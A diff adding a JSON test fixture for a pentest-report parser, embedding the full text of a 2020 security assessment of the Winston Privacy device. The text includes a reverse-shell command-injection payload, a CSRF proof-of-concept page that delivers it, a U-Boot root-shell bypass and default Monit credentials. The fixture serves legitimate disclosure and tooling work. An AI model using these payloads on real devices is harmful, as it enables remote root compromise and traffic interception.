@@ -1,0 +1,500 @@
+{
+  "manifest": {
+    "id": "bishop-fox-winston-privacy-assessment",
+    "vendor": "Bishop Fox",
+    "family": "bishop-fox",
+    "sourceRootEnv": "PUBLIC_REPORT_CORPUS_DIR",
+    "sourcePath": "Bishop Fox/Bishop Fox Assessment Report - Winston Privacy.pdf",
+    "textPath": "data/golden-reports/extracted-text/bishop-fox-winston-privacy-assessment.txt",
+    "expectedPath": "data/golden-reports/expected/bishop-fox-winston-privacy-assessment.json"
+  },
+  "expected": {
+    "id": "bishop-fox-winston-privacy-assessment",
+    "expectedCount": 7,
+    "expectedSeverityCounts": {
+      "Critical": 1,
+      "High": 4,
+      "Medium": 1,
+      "Low": 1
+    },
+    "notes": [
+      "Promoted from verified Stage 4 V4 review queue.",
+      "Source review id: bishop-fox-bishop-fox-assessment-report-winston-privacy-2a382196",
+      "Source path: Bishop Fox/Bishop Fox Assessment Report - Winston Privacy.pdf",
+      "Info / Informational / Note / Minor findings are normalized to Low by the current app model.",
+      "Major findings are normalized to High by the current app model.",
+      "Requires ENABLE_NLP=true and ENABLE_GENERIC_INDEX_ALIGNMENT=true.",
+      "7ASecurity reports also require ENABLE_7ASECURITY_INDEX_ALIGNMENT=true.",
+      "Do not promote the excluded research / expert-witness / manual-hold reports without separate manual review."
+    ]
+  },
+  "report": {
+    "id": "G-bishop-fox-winston-privacy-assessment",
+    "slug": "bishop-fox-winston-privacy-assessment",
+    "name": "bishop-fox-winston-privacy-assessment",
+    "type": "PDF",
+    "uploadedAt": "2026-06-05T23:30:47.397Z",
+    "owner": "AI CTIX Analyzer",
+    "status": "Ready",
+    "findings": 7,
+    "critical": 1,
+    "high": 4,
+    "medium": 1,
+    "low": 1,
+    "summary": "WINSTON PRIVACY — VERSION 1.5.4 Table of Contents.................................................................................................................... 2 Executive Report.....................................................................................................................",
+    "parsingStatus": "parsed",
+    "analysisVersion": 1,
+    "parserVersion": 1,
+    "parsingNotes": [
+      "Structured parser found no blocks; heuristic fallback was used.",
+      "NLP hybrid extraction produced 7 finding(s). Heuristic fallback output was suppressed to avoid duplicate findings.",
+      "Aligned findings with generic official index: 7 -> 7."
+    ],
+    "content": "ASSESSMENT REPORT\nWINSTON PRIVACY — VERSION 1.5.4\nJULY 29, 2020\n\n-- 1 of 26 --\n\n2020/07/29 2\nTABLE OF CONTENTS\nTable of Contents.................................................................................................................... 2\nExecutive Report..................................................................................................................... 3\nProject Overview ............................................................................................................................ 3\nSummary of Findings .................................................................................................................... 3\nVulnerability Report ............................................................................................................... 5\nCommand Injection ........................................................................................................... 5\nCross-site Request Forgery (CSRF) ................................................................................... 9\nImproper Access Controls............................................................................................... 12\nInsecure Cross-origin Resource Sharing (CORS) ........................................................... 15\nInsufficent Authorization Controls ................................................................................. 18\nDefault Credentials .......................................................................................................... 20\nUndocumented SSH Service ........................................................................................... 23\nAppendix A — Measurement Scales ................................................................................... 26\nFinding Severity............................................................................................................................ 26\n\n-- 2 of 26 --\n\n2020/07/29 3\nEXECUTIVE REPORT\nProject Overview\nDuring an ongoing research project, Bishop Fox assessed the\nsecurity of the Winston Privacy device (firmware version 1.5.4). The\nfollowing report details the findings identified during the course of\nthe engagement, which started on July 20, 2020.\nGoals\n• Perform a time-boxed assessment of the product and\nidentify security vulnerabilities that may present risks to\nusers.\nF I N D I N G C O U N T S\n1 Critical\n4 High\n1 Medium\n1 Informational\n7 Total findings\nS C O P E\nWinston Privacy device\nv1.5.4\nD A TE S\n07/20/2020\nKickoff\n07/20/2020 –\n07/29/2020\nActive testing\n07/29/2020\nReport delivery\nSummary of Findings\nThe Winston Privacy device was affected by multiple critical- and high-risk vulnerabilities\nthat resulted in the compromise of the device’s root user account from the context of a\nremote unauthenticated attacker. The externally exposed device setting’s API was\nvulnerable to command injection, which allowed arbitrary system commands to be\nexecuted on the device. Additionally, the API lacked authentication and allowed arbitrary\nAPI requests from cross-origin sites. This was due to a lack of cross-site request forgery\n(CSRF) protections as well as an insecure cross-origin resource sharing (CORS) policy.\nTesting focused only on externally facing services exposed on the device. However, the\nteam’s limited exploration of hardware access controls led to the discovery of additional\nvulnerabilities that also resulted in local root access. Separately, a large area of concern\n\n-- 3 of 26 --\n\n2020/07/29 4\nthat was untested (and beyond the scope of the research conducted) was the use and\nimplementation of cryptography for secure communications.\nGiven the low barrier of exploitation required for the issues identified, the team\nrecommends the investigation of potentially compromised customer devices. Identified\nvulnerabilities should be retested upon patching to verify the integrity of the\nremediation. Further testing is recommended for hardware access controls,\ncryptographic implementation, secure network transmission, and API access controls.\nR E C O M M E N D A TI O N S\nValidate Inputs — Ensure that any user-controlled inputs are considered untrusted.\nPerform server-side checks to ensure input is interpreted only as the expected type and\ncharacter set. Identify and enforce any additional encoding or escaping requirements for\nthe context in which the data will be used.\nEnforce Origin Security — Implement a restrictive CORS policy, limiting additional\norigins to those necessitated by business requirements. Additionally, add a CSRF\nsafeguard mechanism, using an established framework, to ensure sites cannot submit\narbitrary data to the API.\nFollow Principle of Least Privilege — Ensure the application runs with the minimum set\nof privileges to perform business operations. Avoid relying on mechanisms that reduce\nthe security controls of the underlying system (e.g., password-less sudo).\nPerform Additional Testing — Incorporate security testing in the SDLC of application\ndevelopment and establish security test cases to verify the integrity of security controls.\nEnsure the application undergoes annual security testing or consider more frequent\ntests before releasing new major functionality.\n\n-- 4 of 26 --\n\n2020/07/29 5\nASSESSMENT REPORT\nApplication Penetration Testing\nThe assessment team performed an application penetration test with the following target\nin scope:\n• Winston Privacy device (firmware version 1.5.4)\nIdentified Issues\n1 COMMAND INJECTION CRITICAL\nDefinition\nCommand injection occurs when a user passes maliciously crafted input into an\napplication, which then uses the unchecked data in a function that executes at the\noperating-system level. The system, which cannot differentiate between these malicious\ncommands and regular application commands, executes calls within the authority\ncontext of the original application.\nDetails\nThe assessment team determined that the Winston Privacy device management API was\nvulnerable to command injection resulting in unauthenticated remote code execution.\nSpecifically, the /api/advanced_settings endpoint allowed device settings to be\naltered, including the Proxy Address.\nThe following unauthenticated API request was sent with a command injection payload\nin the Proxy Address field, which resulted in a connect-back shell:\nPOST /api/advanced_settings HTTP/1.1\nHost: 192.168.50.62:82\n…omitted for brevity…\n{\"EnableHTTPFiltering\":true,\"EnableHTTPSFiltering\":true,\"EnableBehindRouter\":true,\"P\nroxyAddress\":\"192.168.50.62$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\n192.168.50.88 3137\n>/tmp/f)\",\"Result\":\"\",\"EnableDNSFilter\":true,\"EnableHTTPoverP2P\":false,\"P2P\":\"on\",\"E\nnableSmartBlocking\":true,\"EnableExtensions\":true}\nFIGURE 1 - Request with command injection payload\nTo discover this API endpoint, the Winston Privacy service binaries were extracted and\ndisassembled after the team gained access to the filesystem via a console that was\n\n-- 5 of 26 --\n\n2020/07/29 6\naccessible over a micro USB port, as described in the Local Console Access section of the\nImproper Access Controls finding included in this report.\nThe vulnerable endpoint behavior was implemented in the\nmain.ApplyAdvancedSettingsChanges() function. This function first saved the\nfollowing values into the /etc/winston/config.toml file:\nFIGURE 2 - Function calls in Winston binary in /root/code/go/bin/winston\nThe malicious user input persisted in config.toml, as shown below:\nbehindtherouter=\"1\"\n…omitted for brevity…\nproxy_addr=\"192.168.50.62$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\n192.168.50.88 3137 >/tmp/f)\"\nremote_enable=\"1\"\nsecurity_pin=\"1337\"\n…omitted for brevity…\nFIGURE 3 - config.toml post-exploitation\nWinston then refreshed the iptables rules using the\n/etc/winston/confiptable.sh script:\n\n-- 6 of 26 --\n\n2020/07/29 7\nFIGURE 4 - Winston binary calling confiptable.sh\nThe confiptable.sh script, which is shown below, sourced the config.toml file,\nexecuting the attacker’s command substitution stored in config.toml:\n# Important: This file is configured for the Winston Privacy Board HW1/HW2 from\nGlobalScale.\necho \"Reading config file\"\nsource /etc/winston/config.toml\n…omitted for brevity…\nFIGURE 5 - Excerpt from confiptable.sh\nAs a result, the payload executed and returned a reverse Netcat shell to the attacker-\ncontrolled local server:\nFIGURE 6 - Reverse shell returned\nThis vulnerability allowed any host on the LAN to perform an unauthenticated attack to\nobtain full device compromise. This compromise allowed an attacker to intercept all\ntraffic passing through the Winston Privacy device. It was observed that the Winston\nPrivacy device relied on ARP spoofing to solicit all traffic on the network.\n\n-- 7 of 26 --\n\n2020/07/29 8\nAffected Locations\nEndpoint\n/api/advanced_settings\nTotal Instances 1\nRecommendations\nTo mitigate the risk of command injection, the following actions are recommended:\n• Avoid executing commands directly where possible; prefer existing APIs if they\nare available.\n• Perform strong server-side input validation to ensure that only a valid IP address\nis accepted.\nAdditional Resources\nOWASP Command Injection\nhttps://owasp.org/www-community/attacks/Command_Injection\nOWASP Input Validation Cheat Sheet\nhttps://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_S\nheet.md\n\n-- 8 of 26 --\n\n2020/07/29 9\n2 CROSS-SITE REQUEST FORGERY (CSRF) HIGH\nDefinition\nWeb applications that are vulnerable to CSRF are unable to distinguish between actions\nrequested by a user’s browser and actions the user intends to perform.\nDetails\nThe assessment team identified that the Winston Privacy device management API was\nvulnerable to CSRF. As a result, an attacker could change any device configuration or\nchain this CSRF vulnerability with the Command Injection finding included in this report\nto obtain remote code execution (RCE) as an off-network attacker. This attack chain\nwould allow an off-network attacker to gain root access on the Winston Privacy device as\nwell as a privileged network position on a user’s internal network.\nTo demonstrate how an attacker could leverage this vulnerability, the following proof-of-\nconcept (PoC) HTML document was created:\n<html>\n<title>Winston Privacy CSRF</title>\n<body>\n<style>\nh1 {\ntext-align: center;\ntext-transform: uppercase;\nmargin: 100px 50px 75px 100px;\n}\n</style>\n<h1>CSRF Exploit<br>Proof of Concept </h1>\n<script>\n// api.winstonprivacy.com:82 is the same as local. This function sends CMD\ninjection payload to local Winston API\nfetch('https://api.winstonprivacy.com:82/api/advanced_settings', {\nmethod: 'POST',\nbody:\n'{\"EnableHTTPFiltering\":true,\"EnableHTTPSFiltering\":true,\"EnableBehindRouter\":true,\"\nProxyAddress\":\"192.168.50.62$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\n192.168.50.88 31337\n>/tmp/f)\",\"Result\":\"\",\"EnableDNSFilter\":true,\"EnableHTTPoverP2P\":false,\"P2P\":\"on\",\"E\nnableSmartBlocking\":true,\"EnableExtensions\":true}'\n})\n</script>\n</body>\n</html>\nFIGURE 7 - CSRF exploit PoC code\n\n-- 9 of 26 --\n\n2020/07/29 10\nThis HTML PoC document was then hosted locally as a web page, as shown below:\nFIGURE 8 - CSRF exploit phishing page\nIf a user operating the Winston Privacy device navigated to this page, it would trigger the\ncommand injection API request (as described in the Command Injection finding included\nin this report) and result in code execution:\nFIGURE 9 - Reverse shell returned from CSRF exploit\nThis attack chain allows remote unauthenticated attackers to gain root access on the\nWinston Privacy device, compromising the integrity of inbound and outbound traffic.\nAffected Locations\nApplication\napi.winstonprivacy.com:82 — local device API\nTotal Instances 1\n\n-- 10 of 26 --\n\n2020/07/29 11\nRecommendations\nThe following techniques are suggested to prevent CSRF:\n• Enable CSRF protections using the application’s framework.\n• Alternatively, require proof of interaction between the authenticated user and the\napplication in all requests that alter the state of data. This token can be one of the\nfollowing:\n• A one-time transaction identifier (i.e., a CSRF token) from a transient, page-\nspecific storage location (e.g., a hidden form field) in each request in a\nmulti-stage transaction process. Cross-domain security prevents other\ndomains from accessing the value, and the browser will not automatically\nappend anything except cookies to requests not initiated through the user\ninterface.\n• A one-time transaction identifier from a cookie in a transient, page-specific\nlocation (i.e., a double submission). Cross-domain security prevents other\ndomains from accessing the cookie value. Therefore, a matching value can\nbe submitted in the page-specific location only if the application’s client-\nside JavaScript populates it.\n• For sensitive requests, require reauthentication by the user’s password.\n• Consider implementing the SameSite cookie flag.\nAdditional Resources\nCWE-352: Cross-Site Request Forgery (CSRF)\nhttps://cwe.mitre.org/data/definitions/352.html\nIETF – Updates to RFC6265 Same-site Cookies\nhttps://tools.ietf.org/html/draft-west-first-party-cookies-07#section-1.1\nOWASP – Cross-Site Request Forgery (CSRF)\nhttps://owasp.org/www-community/attacks/csrf\nOWASP – Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet\nhttps://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-\nSite_Request_Forgery_Prevention_Cheat_Sheet.md\n\n-- 11 of 26 --\n\n2020/07/29 12\n3 IMPROPER ACCESS CONTROLS HIGH\nDefinition\nImproper access control vulnerabilities occur when insecure application controls or\nsystem permit security mechanisms to be circumvented and protected resources to be\nillegitimately accessed.\nDetails\nThe assessment team found that excessive permissions for both the www-data user and\nthe Winston Privacy API service facilitated root-level access upon compromise.\nFurthermore, the micro USB console allowed for local root access.\nO V E R L Y P E R M I S SI O N E D L O C A L U S E R\nUser permissions allowed a www-data user to escalate permissions to a root user on\nthe operating system. The www-data user had sudo privileges, which made that user\nequivalent to a root account.\nThe /etc/sudoers file contained the following line:\nwww-data ALL=NOPASSWD:ALL\nFIGURE 10 - Sudoers file granting www-data user no-password sudo permissions\nThis file granted the www-data user privileges to carry out any command on any\nresource without the use of a password, functionally making that user a root account.\nThis account appeared to be a remnant of a previous version of the web API, with the\ndead code still remaining in the device’s firmware.\nO V E R L Y P E R M I S S I O N E D P R O C E S S\nThe Winston Privacy service was running with root permissions, as shown below:\nroot@winston-privacy-v1:~# ps aux | grep winston\n1378 root 0:12 /root/code/go/bin/winston -v 1 -P /var/run/winston.pid\nFIGURE 11 - Process owned by root\nIf a vulnerability existed in the service that resulted in code execution, no further\nexploitation would be required to gain administrative control of the Winston Privacy\ndevice, as demonstrated in the Command Injection finding included in this report.\n\n-- 12 of 26 --\n\n2020/07/29 13\nLO C A L C O N S O L E A C C E S S\nThe Winston Privacy device allowed a user to interrupt the U-Boot process and gain root\naccess.\nWhen the back of the device was taken off, it exposed a micro USB port, which interfaced\nwith the device’s UART functionality. Although the device had disabled the TTY login, this\nwas bypassed by modifying the bootcmd U-Boot environment variable (i.e., the Linux\nkernel parameters) to boot the kernel directly to a root shell via the init boot\nparameter.\nThis interface had enabled the boot interrupt process. Pressing any key during the boot\nprocess interrupted boot and allowed a user to edit the kernel command line:\nWINSTON>> printenv bootcmd\nbootcmd=mmc dev 0;ext4load mmc 0:${mmcrootpart} $kernel_addr $image_name;ext4load\nmmc 0:${mmcrootpart} $fdt_addr $fdt_name;setenv bootargs $console\nroot=/dev/mmcblk0p${mmcrootpart} rw rootwait net.ifnames=0 biosdevname=0;booti\n$kernel_addr - $fdt_addr\nFIGURE 12 - Boot command variables\nEditing this variable instructed the kernel to use /bin/bash as the init process:\nWINSTON>> setenv bootcmd\nbootcmd=mmc dev 0;ext4load mmc 0:${mmcrootpart} $kernel_addr $image_name;ext4load\nmmc 0:${mmcrootpart} $fdt_addr $fdt_name;setenv bootargs $console\nroot=/dev/mmcblk0p${mmcrootpart} rw rootwait net.ifnames=0 biosdevname=0;booti\n$kernel_addr - $fdt_addr init=/bin/bash\nFIGURE 13 - Boot command edited variable\nBooting the device then presented a root shell, granting privileged access to the\nfilesystem.\nAffected Locations\nDevice\nWinston Privacy\nTotal Instances 1\nRecommendations\nTo ensure that malicious users cannot gain unauthorized access to highly privileged files,\nthe following steps are suggested:\n• Disallow the use of password-less sudo.\n\n-- 13 of 26 --\n\n2020/07/29 14\n• If www-data is not in use, remove the account.\n• Avoid running web applications as root. Run applications with the least required\nprivileges. Consider tactics to provide further process isolation.\n• Recompile U-Boot to include silent console configuration. Please refer to the U-\nBoot documentation in the Additional Resources section below for detailed\nguidance.\nAdditional Resources\nCWE-284 Improper Access Control\nhttp://cwe.mitre.org/data/definitions/284.html\nU-Boot Silent Console Configuration\nhttps://gitlab.denx.de/u-boot/u-boot/blob/HEAD/doc/README.silent\n\n-- 14 of 26 --\n\n2020/07/29 15\n4 INSECURE CROSS-ORIGIN RESOURCE\nSHARING (CORS) HIGH\nDefinition\nModern web browsers implement a same-origin policy, which has historically been used\nto restrict the domains a browser can communicate with via asynchronous JavaScript\nand XML (AJAX) HTTP requests. These restrictions prevent client-side JavaScript from\nrunning in the context of one origin and interacting with another. The CORS standard is\ndesigned to allow certain exceptions to this policy. Insecure CORS occurs when an\napplication’s implementation of one or more CORS headers impacts the secrecy,\nintegrity, or authenticity of application data.\nDetails\nThe assessment team identified that the Winston Privacy device management API’s CORS\npolicy allowed arbitrary origins to send requests and view responses. This vulnerable\nCORS policy could be used to change device settings or view devices on the local\nnetwork. It could also be chained with the Command Injection finding included in this\nreport to gain code execution from the context of a remote off-network attacker in the\nsame manner demonstrated in the Cross-site Request Forgery (CSRF) finding (also\nincluded in this report).\nTo confirm this vulnerable CORS policy, a request to add a firewall rule was sent to the\nAPI from a null origin:\nRequest\nPOST /api/firewall HTTP/1.1\nHost: api.winstonprivacy.com:82\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101\nFirefox/78.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain\nContent-Length: 74\nOrigin: null\nConnection: close\nDNT: 1\n{\"protocol\":\"tcp\",\"lanAddress\":\"192.168.50.1\",\"lanPort\":80,\"wanPort\":6666}\n\n-- 15 of 26 --\n\n2020/07/29 16\nResponse\nHTTP/1.1 200 OK\nAccess-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE\nAccess-Control-Allow-Origin: *\nCache-Control: no-cache, no-store, must-revalidate\nContent-Type: application/json; charset=utf-8\nExpires: 0\nPragma: no-cache\nServer: Winston\nVary: Access-Control-Request-Headers\nDate: Thu, 23 Jul 2020 23:59:57 GMT\nContent-Length: 82\nConnection: close\n{\"Id\":3,\"Protocol\":\"tcp\",\"LanAddress\":\"192.168.50.1\",\"LanPort\":80,\"WanPort\":6666}\nAs shown above, the request succeeded and allowed wildcard origin access to the\nresponse.\nThis overly permissive response header derived from the following lighttpd\nconfiguration found in /etc/lighttpd/lighttpd.conf:\nsetenv.add-response-header = ( \"Server\" => \"Winston\", \"Access-Control-Allow-Origin\"\n=> \"*\" )\nFIGURE 14 - Vulnerable CORS policy\nThis vulnerability could be exploited in the same manner as the CSRF finding included in\nthis report. However, CORS allows responses to be viewed; assuming the CSRF issue did\nnot exist, this CORS vulnerability would still affect the API as it stems from a separate\nroot cause. Attackers could also exploit this permissive configuration to both extract\nsensitive information and perform state-changing operations to the remote device\nmanagement API.\nAffected Locations\nApplication\napi.winstonprivacy.com:82 – local device API\nTotal Instances 1\nRecommendations\nThe following techniques are recommended to prevent insecure CORS:\n• Enforce a strict white list of domains; never allow a wildcard or reflect the\nrequest’s origin in the Access-Control-Allow-Origin HTTP header on non-\npublic pages that contain sensitive information.\n\n-- 16 of 26 --\n\n2020/07/29 17\n• Avoid setting Access-Control-Allow-Credentials: true unless there is a\njustified business and technical need for the requesting browser to access the\nresponse of cross-origin credentialed requests. Custom headers used for\nauthorization, such as those using bearer tokens, do not count as credentialed\nrequests in the context of CORS. When Access-Control-Allow-Credentials\nis set to true, the server must strictly validate the intersection of the authority of\nthe user and the requesting origin(s).\nAdditional Resources\nOWASP – CORS OriginHeaderScrutiny\nhttps://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny\n\n-- 17 of 26 --\n\n2020/07/29 18\n5 INSUFFICENT AUTHORIZATION CONTROLS HIGH\nDefinition\nInsufficient authorization controls allow an attacker to circumvent intended user or role-\nbased security mechanisms and access protected resources illegitimately.\nDetails\nThe assessment team found that the Winston Privacy device management API was\naffected by insufficient authorization controls that allowed device settings to be altered\nby unauthenticated users. Even if a PIN was set on the Winston privacy UI, all device\nmanagement API requests continued to be permitted without authentication.\nAs shown below, Winston Privacy web application users could opt in to create a PIN:\nFIGURE 15 - PIN request\nHowever, this PIN is limited to the UI and adds no access control to the back-end API\nsupporting the UI.\nTo demonstrate this issue, the following unauthenticated request was sent after\nestablishing PIN authentication in the UI:\nRequest\nPOST /api/advanced_settings HTTP/1.1\nHost: 192.168.50.62:82\n\n-- 18 of 26 --\n\n2020/07/29 19\n…omitted for brevityy…\n{\"EnableHTTPFiltering\":true,\"EnableHTTPSFiltering\":true,\"EnableBehindRouter\":true,\"P\nroxyAddress\":\"192.168.50.62\",\"Result\":\"\",\"EnableDNSFilter\":true,\"EnableHTTPoverP2P\":\nfalse,\"P2P\":\"on\",\"EnableSmartBlocking\":true,\"EnableExtensions\":true}\nResponse\nHTTP/1.1 200 OK\n…omitted for brevity…\n{\"EnableHTTPFiltering\":true,\"EnableHTTPSFiltering\":true,\"EnableBehindRouter\":true,\"P\nroxyAddress\":\"192.168.50.62\",\"Result\":\"Updated IP tables. Update Proxy IP address to\n192.168.50.62.\",\"EnableDNSFilter\":true,\"EnableHTTPoverP2P\":false,\"P2P\":\"on\",\"EnableS\nmartBlocking\":true,\"EnableExtensions\":true}\nAs shown above, the state-changing request succeeded, showing a 200 OK response\nwithout requiring any credentials or session context.\nAll requests to the API could still be sent successfully without authentication to the user\ninterface.\nAffected Locations\nApplication\napi.winstonprivacy.com:82 — local device API\nTotal Instances 1\nRecommendations\nThe following action is recommended to address insufficient authorization controls:\n• Ensure that strong authentication and authorization controls are implemented for\nall requests that return or modify user data.\nAdditional Resources\nOWASP – Authorization\nhttps://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-\nBroken_Access_Control\n\n-- 19 of 26 --\n\n2020/07/29 20\n6 DEFAULT CREDENTIALS MEDIUM\nDefinition\nDefault accounts are built into systems, applications, databases, and embedded devices\nto provide convenient access prior to configuring official accounts. These accounts are\nprime targets for attackers because they are usually publicly documented and often\noverlooked during system deployment and hardening. In many cases, the password\nassociated with a default account is the same as the username or is similarly weak, and\nonline databases of default account credentials are readily available for malicious users\nto quickly leverage in their attacks. Default accounts remain present due to improper\nhardening of a sensitive resource before it is deployed into a live environment.\nDetails\nThe assessment team identified that the Winston Privacy was running a Monit web\napplication on port 2812 that was configured with default administrative credentials. An\nattacker on the local network could log in to Monit and shut down the Winston Privacy\nservice, thereby disabling the privacy features.\nThe Monit service was configured to accept default credentials on the device, as shown\nin /root/.monitrc:\nallow admin:monit # require user 'admin' with password 'monit'\nFIGURE 16 - Monit default credentials\nThis would allow any user with network access to Winston Privacy to authenticate to the\nservice as the admin user with the password monit:\n\n-- 20 of 26 --\n\n2020/07/29 21\nFIGURE 17 - Monit authenticated with default credentials\nAs shown above, Monit monitors and manages running processes and allows remote\nshutdown of the processes. An attacker with access to this service could disable arbitrary\nservices, affecting the integrity of the services provided by Winston Privacy.\nAffected Locations\nDevice\nWinston Privacy\nTotal Instances 1\nRecommendations\nThe following steps are recommended to prevent the risks associated with using default\ncredentials:\n• Ensure that no applications on the device are using default credentials or static\ncredentials.\n• Determine if there is a business requirement to use Monit or expose it to the LAN.\n\n-- 21 of 26 --\n\n2020/07/29 22\nAdditional Resources\nCISA – Risks of Default Passwords on the Internet\nhttps://www.us-cert.gov/ncas/alerts/TA13-175A\n\n-- 22 of 26 --\n\n2020/07/29 23\n7 UNDOCUMENTED SSH SERVICE INFORMATIONAL\nDefinition\nUndocumented SSH service occurs when software contains SSH functionality that is not\ndocumented and not accessible in a way that is obvious to users or administrators.\nDetails\nThe assessment team found that the Winston Privacy device ran an undocumented SSH\nservice. This service corresponded to a local user account named support. Winston\nPrivacy uses iptables rules to restrict access to the SSH service to pre-defined WAN\nbastion hosts or the LAN.\nDuring review of the Winston Privacy device’s filesystem, a support user was discovered\nin the /etc/passwd file:\nroot:x:0:0:root:/root:/bin/sh\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nntp:x:999:998::/var/lib/ntp:/bin/false\nsshd:x:998:997::/var/run/sshd:/bin/false\nsupport:x:1000:1000::/home/support:/bin/sh\nFIGURE 18 - Contents on /etc/passwd\nBy navigating the support account’s home directory, the team observed that the user\nhad an authorized key configured to allow key authentication to the SSH server running\non the non-standard port 2324:\n\n-- 23 of 26 --\n\n2020/07/29 24\nsh-4.3# pwd\npwd\n/home/support\nsh-4.3# ls -la\nls -la\ntotal 20\ndrwxr-xr-x 3 root root 4096 Jul 25 20:30 .\ndrwxr-xr-x 4 root root 4096 Jul 23 17:56 ..\n-rwxr-xr-x 1 root root 410 Jul 19 16:09 .bashrc\n-rwxr-xr-x 1 root root 152 Jul 19 16:09 .profile\ndrwxr-xr-x 3 1000 support 4096 Jul 21 18:48 .ssh\nsh-4.3# ls -la .ssh\nls -la .ssh\ntotal 16\ndrwxr-r-x 2 root root 4096 Jul 21 18:48\ndrwxr-r-x 3 1000 support 4096 Jul 21 18:48 .\ndrwxr-r-x 3 root root 4096 Jul 25 20:30 ..\n-rwxr-xr-x 1 1000 support 811 Jul 21 18:44 authorized_keys\nFIGURE 19 - Support user’s SSH authorized key file\nFurther investigation into this support user account revealed that the iptables rules\nallowed for remote access from two bastion servers:\n-A INPUT -s 192.168.0.0/16 -p tcp -m tcp --dport 2324 -m conntrack --ctstate NEW\n,ESTABLISHED -j ACCEPT\n-A INPUT -s 172.16.0.0/12 -p tcp -m tcp --dport 2324 -m conntrack --ctstate NEW,\nESTABLISHED -j ACCEPT\n-A INPUT -s 10.0.0.0/8 -p tcp -m tcp --dport 2324 -m conntrack --ctstate NEW,EST\nABLISHED -j ACCEPT\n-A INPUT -s 192.168.102.0/24 -p tcp -m tcp --dport 2324 -m conntrack --ctstate N\nEW,ESTABLISHED -j ACCEPT\n-A INPUT -s 3.18.68.236/32 -p tcp -m tcp --dport 2324 -m conntrack --ctstate NEW\n,ESTABLISHED -j ACCEPT\n-A INPUT -s 50.203.76.10/32 -p tcp -m tcp --dport 2324 -m conntrack --ctstate NE\nW,ESTABLISHED -j ACCEPT\nFIGURE 20 - iptables rules allowing remote access to SSH\nAdditionally, the support user had sudo permissions, functionally making that user a\nroot user.\nThe reason for this remote access support user was unclear. No documentation was\nlocated that stated the device could be remotely accessed by Winston Privacy staff.\nAffected Locations\nDevice\nWinston Privacy\nTotal Instances 1\n\n-- 24 of 26 --\n\n2020/07/29 25\nRecommendations\nThe following steps are recommended to prevent remote access by users:\n• Remove SSH remote access.\n• Document this issue and inform customers that their device may be remotely\naccessed during a support claim.\nAdditional Resources\nMitre CWE-912 Hidden Functionality\nhttps://cwe.mitre.org/data/definitions/912.html#:~:text=The%20software%20contains%20functio\nnality%20that,the%20software's%20users%20or%20administrators.\n\n-- 25 of 26 --\n\n2020/07/29 26\nAPPENDIX A — MEASUREMENT SCALES\nFinding Severity\nBishop Fox determines severity ratings using in-house expertise and industry-standard\nrating methodologies such as the Open Web Application Security Project (OWASP) and the\nCommon Vulnerability Scoring System (CVSS).\nThe severity of each finding in this report was determined independently of the severity of\nother findings. Vulnerabilities assigned a higher severity have more significant technical\nand business impact and achieve that impact through fewer dependencies on other flaws.\nCritical Vulnerability is an otherwise high-severity issue with additional security\nimplications that could lead to exceptional business impact. Findings are marked\nas critical severity to communicate an exigent need for immediate remediation.\nExamples include threats to human safety, permanent loss or compromise of\nbusiness-critical data, and evidence of prior compromise.\nHigh Vulnerability introduces significant technical risk to the system that is not\ncontingent on other issues being present to exploit. Examples include creating a\nbreach in the confidentiality or integrity of sensitive business data, customer\ninformation, or administrative and user accounts.\nMedium Vulnerability does not in isolation lead directly to the exposure of sensitive\nbusiness data. However, it can be leveraged in conjunction with another issue to\nexpose business risk. Examples include insecurely storing user credentials,\ntransmitting sensitive data unencrypted, and improper network segmentation.\nLow Vulnerability may result in limited risk or require the presence of multiple\nadditional vulnerabilities to become exploitable. Examples include overly\nverbose error messages, insecure TLS configurations, and detailed banner\ninformation disclosure.\nInformational Finding does not have a direct security impact but represents an opportunity to\nadd an additional layer of security, is a deviation from best practices, or is a\nsecurity-relevant observation that may lead to exploitable vulnerabilities in the\nfuture. Examples include vulnerable yet unused source code and missing HTTP\nsecurity headers.\n\n-- 26 of 26 --",
+    "sourceFileName": "Bishop Fox Assessment Report - Winston Privacy.pdf",
+    "createdAtIso": "2026-06-05T23:30:55.043Z",
+    "updatedAtIso": "2026-06-05T23:30:55.043Z"
+  },
+  "findings": [
+    {
+      "id": "F-bishop-001",
+      "slug": "command-injection-investigation-scope",
+      "reportId": "G-bishop-fox-winston-privacy-assessment",
+      "reportName": "bishop-fox-winston-privacy-assessment",
+      "title": "Command Injection",
+      "cve": "—",
+      "severity": "Critical",
+      "asset": "investigation-scope",
+      "score": 94,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:30:47.397Z",
+      "summary": "COMMAND INJECTION affecting investigation-scope; extractor found type Command Injection. Warning: Finding generated from bounded report catalog; review detailed body before training",
